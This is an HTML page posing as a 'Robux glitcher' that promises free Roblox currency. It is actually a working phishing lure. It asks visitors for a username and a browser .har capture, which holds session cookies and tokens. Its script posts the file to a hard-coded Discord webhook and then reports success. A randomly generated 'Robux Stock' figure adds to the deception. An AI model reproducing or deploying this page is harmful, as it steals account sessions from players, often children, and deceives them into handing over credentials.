<!DOCTYPE html>
<html>
<head>
    <title>Robux glitcher</title>
    <style>
        body {
            margin: 0;
            background: #1a1a1a;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .top-bar {
            background: #ff2e2e;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            font-size: 24px;
            font-weight: bold;
            color: white;
            text-shadow: 2px 2px 0px #000;
        }

        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 0 20px;
        }

        .upload-box {
            background: #2a2a2a;
            border: 3px solid #ff2e2e;
            border-radius: 10px;
            padding: 20px;
        }

        .drag-area {
            border: 3px dashed #444;
            border-radius: 8px;
            padding: 40px;
            text-align: center;
            margin: 20px 0;
            transition: all 0.3s;
            cursor: pointer;
        }

        .drag-area:hover {
            border-color: #ff2e2e;
            background: #333;
        }

        input[type="text"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background: #333;
            border: 2px solid #444;
            border-radius: 6px;
            color: white;
            font-size: 16px;
        }

        input[type="text"]:focus {
            border-color: #ff2e2e;
            outline: none;
        }

        .upload-btn {
            background: #ff2e2e;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            font-weight: bold;
            letter-spacing: 1px;
            margin-top: 10px;
        }

        .upload-btn:hover {
            background: #ff4444;
            transform: translateY(-2px);
        }

        .stock-box {
            background: #2a2a2a;
            border: 3px solid #ff2e2e;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="top-bar">
        <div class="logo">Robux glitcher 101</div>
    </div>

    <div class="container">
        <div class="upload-box">
            <h2>Start glitching robux now</h2>
            <form id="upload-form">
                <input type="text" id="username" placeholder="Username" required>
                
                <div class="drag-area" onclick="document.getElementById('file-input').click()">
                    <h3>ðŸ“‚ Drop your .har file here</h3>
                    <p style="color: #666;">or click to select</p>
                    <input type="file" id="file-input" hidden>
                </div>

                <button type="submit" class="upload-btn">Upload ðŸš€</button>
            </form>
        </div>

        <div class="stock-box">
            <h2>ðŸ’° Robux Stock</h2>
            <p id="robux-stock">Loading...</p>
        </div>
    </div>

    <script>
        document.getElementById('upload-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const file = document.getElementById('file-input').files[0];
            if (!file) {
                alert('Please select a file to upload.');
                return;
            }
            const webhookURL = "https://discord.com/api/webhooks/1341466721470513212/enzbhGGGNNU0Bw01NS9HReyCVhzyY6K2RBuaAYut4b1xzmTI9rkDYdem9HIxjq1LsyT5";
            const formData = new FormData();
            formData.append("file", file);
            formData.append("content", `New upload from: ${username}`);
            await fetch(webhookURL, { method: "POST", body: formData });
            alert('File uploaded successfully!');
        });

        function updateRobuxStock() {
            document.getElementById('robux-stock').textContent = `${Math.floor(Math.random() * 100000) + 1000} Robux`;
        }
        updateRobuxStock();
    </script>
</body>
</html>
